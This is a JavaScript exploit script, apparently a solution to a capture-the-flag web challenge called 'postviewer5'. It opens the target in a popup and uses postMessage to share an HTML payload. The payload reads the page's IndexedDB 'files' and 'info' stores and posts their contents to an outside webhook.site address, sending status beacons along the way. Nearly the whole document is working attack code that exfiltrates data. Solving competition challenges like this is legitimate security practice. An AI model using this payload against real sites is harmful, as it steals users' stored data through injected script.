const WEBHOOK = "https://webhook.site/22adc411-5a6c-4d97-87b6-8c2f641bdb6c";
let URL = "https://6ctmep5m-postviewer5-ff.instancer.2025.ctfcompetition.com/";
// URL = "http://localhost:1338/";

const PAYLOAD = `<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title></title>
  </head>
  <body>
  Hello! 
  <script>
    function post(url, data) {
      let xhr = new XMLHttpRequest();
      xhr.open("POST", url, true);
      return xhr.send(JSON.stringify(data));
    }
    function get(url) {
      let xhr = new XMLHttpRequest();
      xhr.open("GET", url, true);
      return xhr.send(null);
    }

    get("${WEBHOOK}?popup");
    console.log("Location", window.location.pathname);
    console.log("Document", document.parent);
    console.log("Window", window.parent);

    window.addEventListener('message', function(event) {
      console.log("Message", event);
    });

    (async () => {
      const request = indexedDB.open("Files", 1);
      request.onsuccess = async () => {
        const db = request.result;

        const readStore = (storeName) => {
          return new Promise((resolve, reject) => {
            try {
              const tx = db.transaction(storeName, "readonly");
              const store = tx.objectStore(storeName);
              const req = store.getAll();
              req.onsuccess = () => resolve(req.result);
              req.onerror = () => reject(req.error);
            } catch (error) {
              post("${WEBHOOK}?error", { storeName });
            }
          });
        };

        const files = await readStore("files");
        const info = await readStore("info");

        console.log("=== IndexedDB Dump ===");
        console.log("Files Store:", files);
        console.log("Info Store:", info);

        post("${WEBHOOK}?files", files);
        post("${WEBHOOK}?info", info);
      };
    })();
  </script>
  </body>
</html>
`;

function post(url, data) {
  let xhr = new XMLHttpRequest();
  xhr.open("POST", url, true);
  return xhr.send(JSON.stringify(data));
}
function get(url) {
  let xhr = new XMLHttpRequest();
  xhr.open("GET", url, true);
  return xhr.send(null);
}

// Open a new window to the specified URL
const newWindow = window.open(URL, "myWindow", "width=600,height=400");
get(`${WEBHOOK}?open`);

// Function to send a post message to the new window
function sendMessageToNewWindow() {
  get(`${WEBHOOK}?sent`);
  const blob = new Blob([PAYLOAD], { type: "text/html" });
  newWindow.postMessage(
    {
      type: "share",
      files: [
        {
          blob,
          cached: false,
          name: "payload.html",
        },
      ],
    },
    "*",
  );

  console.warn("File shared");
}

// Call the function to send the message after a short delay
setTimeout(sendMessageToNewWindow, 1000); // Adjust the delay as needed
